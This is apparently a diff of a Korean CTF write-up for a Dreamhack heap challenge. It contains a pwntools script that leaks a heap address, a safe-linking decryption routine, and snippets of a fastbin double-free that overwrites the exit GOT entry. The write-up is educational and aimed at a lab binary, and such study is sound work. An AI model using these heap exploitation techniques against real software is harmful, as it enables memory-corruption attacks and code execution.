@@ -64,17 +64,11 @@ struct note notes[10];
 
 2 : read
 
-
-
 - idx (0~9) 노트 선택
 
 - print 해당 노트 data 출력
 
-
-
 3 : update
-
-
 
 - idx (0~9) 노트 선택
 
@@ -143,32 +137,18 @@ https://github.com/shellphish/how2heap/blob/master/glibc_2.32/decrypt_safe_linki
 ```python
 
 def decrypt(cipher):
-
 key = 0
-
 plain = 0
 
-
-
 for i in range(1, 6):
-
     bits = 64-12*i
-
     if bits < 0:
-
         bits = 0
-
     plain = ((cipher ^ key) >> bits) << bits
-
     key = plain >> 12
 
-
-
 return plain
-
 ```
-
-
 
 ![image.png](/assets/img/dh5note/image12.png)
 
@@ -176,126 +156,68 @@ return plain
 
 ![image.png](/assets/img/dh5note/image13.png)
 
-
-
 heap 영역 leak 성공
-
-
 
 이때 사용한 코드
 
 
-
 ```python
-
 from pwn import *
 
-
-
 #p = remote("host8.dreamhack.games", 24028)
-
 p = remote('localhost', 31337)
-
 #p = process('./note')
-
 elf = ELF("./note")
 
-
-
 def create(idx, size, data):
-
 p.sendline(b'1')
-
 p.sendlineafter(b'idx: ', str(idx).encode())
-
 p.sendlineafter(b'size: ', str(size).encode())
-
 p.sendafter(b'data: ', data)
 
-
-
 def read_note(idx):
-
 p.sendline(b'2')
-
 p.sendlineafter(b'idx: ', str(idx).encode())
-
 p.recvuntil(b"data: ")
-
 leak = p.recvline().strip()
 
 return leak
 
-
-
 def update(idx, data):
-
 p.sendline(b'3')
-
 p.sendlineafter(b'idx: ', str(idx).encode())
-
 p.sendafter(b'data: ', data)
 
-
-
 def delete(idx):
-
 p.sendline(b'4')
-
 p.sendlineafter(b'idx: ', str(idx).encode())
 
-
-
 def decrypt(cipher):
-
 key = 0
-
 plain = 0
 
-
-
 for i in range(1, 6):
-
     bits = 64-12*i
-
     if bits < 0:
-
         bits = 0
-
     plain = ((cipher ^ key) >> bits) << bits
-
     key = plain >> 12
-
-
 
 return plain
 
-
-
 for _ in range(7):
-
 create(9, 0x30, b'a')
-
 delete(9)
 
-
-
 leak = read_note(9)
-
 cipher = u64(leak.ljust(8, b'\x00'))
-
 print('leak : ', hex(cipher))
-
 decrypted_leak = decrypt(cipher)
-
 print('decrypted_leak : ', hex(decrypted_leak))
-
-
 
 pause()
 
 p.interactive()
-
 ```
 
 
@@ -366,15 +288,10 @@ fastbin의 특성상 중복된 주소가 리스트에 두 번 들어가게 되�
 
 ```c
 typedef struct {
-
 size_t size;
-
 char *data;
-
 } Note;
-
 note notes[10];  // .bss: 0x4040A8 시작
-
 ```
 
 
@@ -515,9 +432,7 @@ create(7, 0x60, p64(elf.got['exit']))
 
 ```python
 delete(0); # A
-
 delete(1); # B
-
 delete(0); # A double free 발생!
 ```
 
@@ -551,9 +466,7 @@ fd = fake_addr ^ (heap_base >> 12) 이어야 bypass 가능하다.
 
 ```python
 create(1, 0x60, b'b')  # B
-
 create(2, 0x60, b'a')  # A again
-
 create(3, 0x60, p64(elf.got['exit']))  # fake_chunk에 malloc 됨
 ```
 
